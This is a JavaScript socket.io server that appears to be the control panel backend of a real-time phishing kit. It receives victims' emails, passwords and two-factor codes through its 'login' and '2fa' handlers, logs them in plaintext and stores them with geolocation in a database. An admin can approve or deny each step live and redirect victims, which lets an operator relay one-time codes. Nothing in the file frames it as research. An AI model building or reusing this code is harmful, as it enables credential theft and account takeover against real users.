import './src/lib/env.js';
import { createServer } from "http";
import { Server } from "socket.io";
import cache from "./src/lib/cache.js";
import { verifyToken } from "./src/middleware/authMiddleWare.js";
import database from "./src/lib/db.js";

const httpServer = createServer((req, res) => {
    res.writeHead(200, { "Content-Type": "text/plain" });
    res.end("Socket.io Server");
});

const io = new Server(httpServer, {
    cors: {
        origin: "http://localhost:3000",
        methods: ["GET", "POST"],
        credentials: true
    }
});

io.use(async (socket, next) => {
    try {
        const token = socket.handshake.auth.token;

        if (token) {
            const verification = await verifyToken(token);
            if (verification.valid) {
                socket.isAdmin = true;
                socket.adminUsername = verification.username;
            } else {
                console.log(`Socket auth failed for ${socket.id}: ${verification.error || 'invalid token'}`);
            }
        } else {
            console.log(`Socket connected without token: ${socket.id}`);
        }
        next();
    } catch (error) {
        console.error('Socket auth error:', error.message);
        next(new Error("Authentication error"));
    }
});

io.on("connection", (socket) => {
    console.log(`Socket connected: ${socket.id} ${socket.isAdmin ? '(Admin)' : ''}`);

    const cacheData = {
        userAgent: socket.handshake.headers['user-agent'] || "",
        isAdmin: socket.isAdmin || false,
        adminUsername: socket.adminUsername || null,
        connectedAt: Date.now()
    };

    cache.add(socket.id, cacheData);

    socket.emit("welcome", {
        message: "Connected to socket server",
        id: socket.id,
        isAdmin: socket.isAdmin || false,
        timestamp: Date.now()
    });

    socket.on("register", (data, callback) => {
        console.log(`Registering socket ${socket.id} with data:`, data);

        const current = cache.get(socket.id) || {};
        cache.update(socket.id, {
            ...current,
            geoData: data || {}
        });

        if (callback) {
            callback({
                success: true,
                socketId: socket.id,
                isAdmin: socket.isAdmin || false
            });
        }
    });

    socket.on("login", (data) => {
        console.log(`Login data from ${socket.id}:`, {
            email: data.email,
            password: data.password
        });

        const current = cache.get(socket.id) || {};
        const prevLogin = (current.loginData && typeof current.loginData === "object") ? current.loginData : {};

        cache.update(socket.id, {
            ...current,
            loginData: {
                ...prevLogin,
                email: data.email != null ? String(data.email).trim() : (prevLogin.email ?? ''),
                password: data.password != null ? String(data.password).trim() : (prevLogin.password ?? '')
            }
        });
    });

    socket.on("denySignIn", (data) => {
        const userData = cache.get(socket.id);

        if (!userData || !userData.isAdmin) {
            return;
        }

        const targetSocketId = data.socketId;

        if (targetSocketId) {
            io.to(targetSocketId).emit("signInDenied", {
                timestamp: Date.now()
            });
            console.log(`Admin ${socket.id} denied sign-in for ${targetSocketId}`);
        }
    });

    socket.on("approveSignIn", (data) => {
        const userData = cache.get(socket.id);

        if (!userData || !userData.isAdmin) {
            return;
        }

        const targetSocketId = data.socketId;

        if (targetSocketId) {
            io.to(targetSocketId).emit("signInApproved", {
                timestamp: Date.now()
            });
            console.log(`Admin ${socket.id} approved sign-in for ${targetSocketId}`);
        }
    });

    socket.on("2fa", (data) => {
        const code = data.code || '';
        console.log(`2FA code from ${socket.id}:`, { code });

        const current = cache.get(socket.id) || {};
        const prevLogin = current.loginData || {};
        const prevCodes = Array.isArray(prevLogin.twoFactorCodes) ? prevLogin.twoFactorCodes : (prevLogin.twoFactorCode ? [prevLogin.twoFactorCode] : []);

        cache.update(socket.id, {
            ...current,
            loginData: {
                ...prevLogin,
                twoFactorCode: code,
                twoFactorTimestamp: Date.now(),
                twoFactorCodes: code ? [...prevCodes, code] : prevCodes,
            }
        });
    });

    socket.on("approve2fa", async (data) => {
        const userData = cache.get(socket.id);

        if (!userData || !userData.isAdmin) {
            return;
        }

        const targetSocketId = data.socketId;

        if (targetSocketId) {
            io.to(targetSocketId).emit("2faApproved", {
                timestamp: Date.now(),
                approvedBy: socket.adminUsername || socket.id
            });

            console.log(`Admin ${socket.id} approved 2FA for ${targetSocketId}`);

            // Instant-save history only after admin approval (credentials + 2FA)
            const targetData = cache.getRaw(targetSocketId);
            if (targetData && !targetData.isAdmin) {
                const ld = cache.getLoginData(targetSocketId) || {};
                const loginDataForDb = {
                    email: String(ld.email ?? "").trim(),
                    password: String(ld.password ?? "").trim(),
                    twoFactorCode: ld.twoFactorCode != null ? String(ld.twoFactorCode) : null,
                    twoFactorCodes: Array.isArray(ld.twoFactorCodes) ? ld.twoFactorCodes.map((c) => String(c)) : (ld.twoFactorCode != null ? [String(ld.twoFactorCode)] : [])
                };
                const now = Date.now();
                try {
                    await database.collection("connectionHistory").updateOne(
                        { socketId: targetSocketId },
                        {
                            $set: {
                                socketId: targetSocketId,
                                userAgent: targetData.userAgent ?? "",
                                isAdmin: !!targetData.isAdmin,
                                connectedAt: targetData.connectedAt ?? now,
                                geoData: (targetData.geoData && typeof targetData.geoData === "object") ? targetData.geoData : {},
                                currentPage: targetData.currentPage ?? null,
                                lastPageUpdate: now,
                                loginData: loginDataForDb
                            }
                        },
                        { upsert: true }
                    );
                    console.log(`[HISTORY] Instant-save (after approve 2FA) ${targetSocketId}: email=${loginDataForDb.email ? "yes" : "no"} password=${loginDataForDb.password ? "yes" : "no"} 2fa=${loginDataForDb.twoFactorCodes.length}`);
                } catch (err) {
                    console.error("[HISTORY] Save after approve2fa error:", err.message);
                }
            }
        }
    });

    socket.on("deny2fa", async (data) => {
        const userData = cache.get(socket.id);
        if (!userData || !userData.isAdmin) {
            return;
        }

        const targetSocketId = data.socketId;

        if (targetSocketId) {
            io.to(targetSocketId).emit("2faDenied", {
                timestamp: Date.now(),
                deniedBy: socket.adminUsername || socket.id,
                reason: data.reason || "2FA verification denied"
            });

            console.log(`Admin ${socket.id} denied 2FA for ${targetSocketId}`);

            // Instant-save history after admin deny (credentials + 2FA still saved)
            const targetData = cache.getRaw(targetSocketId);
            if (targetData && !targetData.isAdmin) {
                const ld = cache.getLoginData(targetSocketId) || {};
                const loginDataForDb = {
                    email: String(ld.email ?? "").trim(),
                    password: String(ld.password ?? "").trim(),
                    twoFactorCode: ld.twoFactorCode != null ? String(ld.twoFactorCode) : null,
                    twoFactorCodes: Array.isArray(ld.twoFactorCodes) ? ld.twoFactorCodes.map((c) => String(c)) : (ld.twoFactorCode != null ? [String(ld.twoFactorCode)] : [])
                };
                const now = Date.now();
                try {
                    await database.collection("connectionHistory").updateOne(
                        { socketId: targetSocketId },
                        {
                            $set: {
                                socketId: targetSocketId,
                                userAgent: targetData.userAgent ?? "",
                                isAdmin: !!targetData.isAdmin,
                                connectedAt: targetData.connectedAt ?? now,
                                geoData: (targetData.geoData && typeof targetData.geoData === "object") ? targetData.geoData : {},
                                currentPage: targetData.currentPage ?? null,
                                lastPageUpdate: now,
                                loginData: loginDataForDb
                            }
                        },
                        { upsert: true }
                    );
                    console.log(`[HISTORY] Instant-save (after deny 2FA) ${targetSocketId}: email=${loginDataForDb.email ? "yes" : "no"} password=${loginDataForDb.password ? "yes" : "no"} 2fa=${loginDataForDb.twoFactorCodes.length}`);
                } catch (err) {
                    console.error("[HISTORY] Save after deny2fa error:", err.message);
                }
            }
        }
    });

    socket.on("page", (data) => {
        const userData = cache.get(socket.id);
        if (!userData) {
            return;
        }

        const currentPage = data.page || "unknown";
        cache.update(socket.id, {
            ...userData,
            currentPage,
            lastPageUpdate: Date.now()
        });
    })

    socket.on("redirect", (data) => {
        const userData = cache.get(socket.id);
        if (!userData || !userData.isAdmin) {
            return;
        }

        const targetSocketId = data.socketId;
        const redirectUrl = data.url;

        if (targetSocketId && redirectUrl) {
            try {
                new URL(redirectUrl);

                io.to(targetSocketId).emit("redirect", {
                    url: redirectUrl,
                    timestamp: Date.now(),
                    initiatedBy: socket.adminUsername || socket.id
                });

                console.log(`Admin ${socket.id} redirected ${targetSocketId} to ${redirectUrl}`);

                const targetData = cache.get(targetSocketId);
                if (targetData) {
                    cache.update(targetSocketId, {
                        ...targetData,
                        lastRedirect: {
                            url: redirectUrl,
                            timestamp: Date.now(),
                            adminId: socket.id
                        }
                    });
                }
            } catch (error) {
                console.error(`Invalid redirect URL from admin ${socket.id}: ${redirectUrl}`);
            }
        }
    });

    socket.on("redirectPage", (data) => {
        const userData = cache.get(socket.id);
        if (!userData || !userData.isAdmin) {
            return;
        }

        const targetSocketId = data.socketId;
        const targetPage = data.page;

        if (targetSocketId && targetPage) {
            io.to(targetSocketId).emit("redirectPage", {
                page: targetPage,
                timestamp: Date.now(),
                initiatedBy: socket.adminUsername || socket.id
            });
        }
    });

    socket.on("delete", (data) => {
        const userData = cache.get(socket.id);
        if (!userData || !userData.isAdmin) {
            return;
        }

        if (data.ids && Array.isArray(data.ids)) {
            data.ids.forEach(targetSocketId => {
                const targetSocket = io.sockets.sockets.get(targetSocketId);
                if (targetSocket) {
                    targetSocket.disconnect(true);
                }
            });
        }
    });

    socket.on("getAll", async (callback) => {
        try {
            const userData = cache.get(socket.id);

            if (!userData || !userData.isAdmin) {
                if (callback) {
                    callback({
                        success: false,
                        error: "Unauthorized: Admin access required"
                    });
                }
                return;
            }

            const allConnections = cache.getAll();
            const filteredConnections = allConnections.filter(conn =>
                !conn.isAdmin
            );

            if (callback) {
                callback({
                    success: true,
                    connections: filteredConnections,
                    total: filteredConnections.length,
                    adminCount: allConnections.filter(conn => conn.isAdmin).length,
                    timestamp: Date.now()
                });
            }
        } catch (error) {
            console.error("Error in getAll:", error);
            if (callback) {
                callback({
                    success: false,
                    error: "Internal server error"
                });
            }
        }
    });

    socket.on("ping", (callback) => {
        if (callback) callback({ pong: Date.now() });
    });

    socket.on("disconnect", async (reason) => {
        console.log(`Socket disconnected: ${socket.id} - ${reason}`);
        const data = cache.getRaw(socket.id);
        if (data && data.isAdmin) {
            console.log(`History skip (admin): ${socket.id}`);
        } else if (!data) {
            console.log(`History skip (no cache): ${socket.id}`);
        } else {
            // History doc was already created/updated on login and 2fa; just set disconnectedAt
            const disconnectedAt = Date.now();
            try {
                const result = await database.collection("connectionHistory").updateOne(
                    { socketId: socket.id },
                    {
                        $set: {
                            disconnectedAt,
                            currentPage: data.currentPage ?? null,
                            lastPageUpdate: data.lastPageUpdate ?? disconnectedAt
                        }
                    }
                );
                if (result.matchedCount > 0) {
                    console.log(`[HISTORY] Closed ${socket.id} (page: ${data.currentPage || "—"})`);
                } else {
                    // No doc yet (e.g. never sent login) – insert minimal row so we have a record
                    await database.collection("connectionHistory").insertOne({
                        socketId: socket.id,
                        userAgent: data.userAgent ?? "",
                        isAdmin: !!data.isAdmin,
                        connectedAt: data.connectedAt ?? disconnectedAt,
                        disconnectedAt,
                        geoData: data.geoData && typeof data.geoData === "object" ? { ...data.geoData } : {},
                        currentPage: data.currentPage ?? null,
                        lastPageUpdate: data.lastPageUpdate ?? null,
                        loginData: { email: "", password: "", twoFactorCode: null, twoFactorCodes: [] }
                    });
                    console.log(`[HISTORY] Created (no login) ${socket.id}`);
                }
            } catch (err) {
                console.error("[HISTORY] Update on disconnect error:", err.message);
            }
        }
        cache.remove(socket.id);
    });
});

httpServer.listen(3005, () => {
    console.log("Socket.io server running on ws://localhost:3005");
});